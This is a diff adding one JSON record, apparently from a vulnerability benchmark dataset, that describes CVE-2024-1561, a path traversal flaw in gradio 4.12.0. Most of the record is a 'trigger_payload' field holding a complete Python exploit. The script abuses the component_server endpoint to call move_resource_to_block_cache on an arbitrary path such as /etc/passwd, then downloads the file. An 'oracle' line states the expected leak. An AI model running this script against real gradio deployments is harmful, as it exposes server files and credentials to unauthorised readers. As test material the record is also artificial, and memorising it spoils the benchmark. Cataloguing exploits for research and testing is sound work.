@@ -1,0 +1,15 @@
+{
+  "file_id": "341_gradio_huntr_4acf584e-2fe8-490e-878d-2d9bf2698338",
+  "numeric_id": "341",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Arbitrary method invocation in Component class allows local file read via move_resource_to_block_cache",
+  "cve": "CVE-2024-1561",
+  "cwe": "CWE-29: Path Traversal: '\\..\\filename'",
+  "library": "gradio",
+  "affected_version": "== 4.12.0",
+  "vulnerable_function": "move_resource_to_block_cache",
+  "triggerability": "direct",
+  "trigger_payload": "from argparse import ArgumentParser\nfrom requests import Session\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--url\", required=True)\n    parser.add_argument(\"--path\", default=\"/etc/passwd\")\n    args = parser.parse_args()\n    url_base = args.url\n    with Session() as s:\n        # get app config:\n        rsp = s.get(f\"{url_base}/config\")\n        # grab any valid component_id:\n        component_id = rsp.json()[\"components\"][0][\"id\"]\n        rsp = s.post(f\"{url_base}/component_server\", json={\n            \"component_id\" : component_id,\n            \"data\" : args.path, # \"/etc/passwd\",\n            \"fn_name\" : \"move_resource_to_block_cache\",\n            \"session_hash\" : \"aaaaaaaaaaa\"\n        })\n        path = rsp.json()\n        rsp = s.get(f\"{url_base}/file={path}\")\n        print(rsp.text)",
+  "oracle": "The /file={path} endpoint returns the contents of a file on the server's filesystem, such as /etc/passwd"
+}
